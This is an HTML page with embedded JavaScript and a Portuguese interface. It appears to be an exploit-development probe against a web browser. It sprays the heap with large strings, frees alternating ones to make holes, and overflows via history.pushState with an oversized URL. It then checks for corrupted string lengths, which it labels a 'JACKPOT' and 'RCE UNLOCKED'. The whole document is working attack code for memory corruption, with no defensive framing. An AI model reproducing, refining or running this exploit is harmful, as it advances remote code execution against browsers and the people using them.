<!DOCTYPE html>
<html>
<head>
    <title>Nano-Step Scanner (Limit Finder)</title>
    <style>
        body { background-color: #000; color: #00ff00; font-family: monospace; padding: 20px; }
        button { 
            font-size: 20px; padding: 15px; width: 100%; border: 2px solid #00ff00; background: #111; color: #fff; cursor: pointer; margin-bottom: 10px;
        }
        #log { border: 1px solid #333; height: 400px; overflow-y: scroll; padding: 10px; color: cyan; font-size: 14px;}
        .crash { color: red; font-weight: bold; border: 1px solid red; }
    </style>
</head>
<body>

    <h1>Nano-Step Scanner</h1>
    <p>Descobrindo o limite seguro de overflow antes do crash.</p>

    <button onclick="runTest(128)">1. Testar +128 Bytes</button>
    <button onclick="runTest(512)">2. Testar +512 Bytes</button>
    <button onclick="runTest(1024)">3. Testar +1 KB (1024)</button>
    <button onclick="runTest(4096)">4. Testar +4 KB (4096)</button>
    <button onclick="runTest(8192)">5. Testar +8 KB (8192)</button>
    
    <div id="log">Pronto. Reinicie o console.</div>

    <script>
        const BASE_OFFSET = 709520; // Ponto fixo dos dados

        // Vítima: 1MB TextDecoder (O mais estável)
        const TARGET_SIZE = 1024 * 1024; 
        const PAYLOAD_SIZE = TARGET_SIZE - 24; 

        var victims = [];

        function log(msg, type) {
            const el = document.getElementById('log');
            let cls = type === 'crash' ? 'class="crash"' : '';
            el.innerHTML += `<div ${cls}>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
            el.scrollTop = el.scrollHeight;
        }

        async function runTest(amount) {
            log(`----------------------------------------`);
            log(`TESTANDO OVERFLOW: +${amount} Bytes`);

            // 1. Limpeza
            victims = [];
            await forceGC();

            try {
                // 2. SPRAY (Cópia exata do sucesso)
                let rawBuffer = new Uint8Array(PAYLOAD_SIZE);
                rawBuffer.fill(0x42); 
                let decoder = new TextDecoder("utf-8");
                let baseString = decoder.decode(rawBuffer);

                const SPRAY_COUNT = 60; 
                for(let i=0; i<SPRAY_COUNT; i++) {
                    let s = i + "_" + baseString.substring((i+"_").length);
                    victims.push(s);
                }

                // 3. BURACOS
                log("Criando buracos...");
                for(let i=0; i<SPRAY_COUNT; i+=2) {
                    victims[i] = null;
                }

                await forceGC();

                // 4. EXPLOIT
                log(`Disparando...`);
                setTimeout(() => {
                    try {
                        let buffer = "A".repeat(BASE_OFFSET);
                        // AQUI ESTÁ A MUDANÇA: Quantidade controlada
                        buffer += "\x01".repeat(amount);
                        
                        history.pushState({}, "nano_" + amount, "/" + buffer);

                        log("Sobreviveu ao disparo. Verificando...");
                        checkVictims(PAYLOAD_SIZE, amount);

                    } catch (e) {
                        log("Erro JS: " + e.message);
                    }
                }, 500);

            } catch(e) {
                log("Erro Memória: " + e.message);
            }
        }

        function checkVictims(expectedLen, amt) {
            let success = false;
            for(let i=1; i<victims.length; i+=2) {
                let s = victims[i];
                if(!s) continue;

                try {
                    let err = new Error(s);
                    let msg = err.message;

                    // SUCESSO (Length)
                    if (msg.length !== expectedLen) {
                        log(`!!! JACKPOT !!! Length Corrompido com +${amt}!`, 'crash');
                        alert("RCE UNLOCKED!");
                        success = true;
                        break;
                    }

                    // SUCESSO PARCIAL (Dados)
                    if (msg.charCodeAt(0) === 1) {
                        log(`[Sucesso] DADOS atingidos com +${amt}. O Header ainda está longe?`, 'green');
                        success = true;
                        break;
                    }
                } catch(e) {}
            }
            if(!success) log(`Nada atingido com +${amt}. (Seguro ou Miss)`);
        }

        async function forceGC() {
            try { new ArrayBuffer(50 * 1024 * 1024); } catch(e){}
            return new Promise(r => setTimeout(r, 600));
        }
    </script>
</body>
</html>
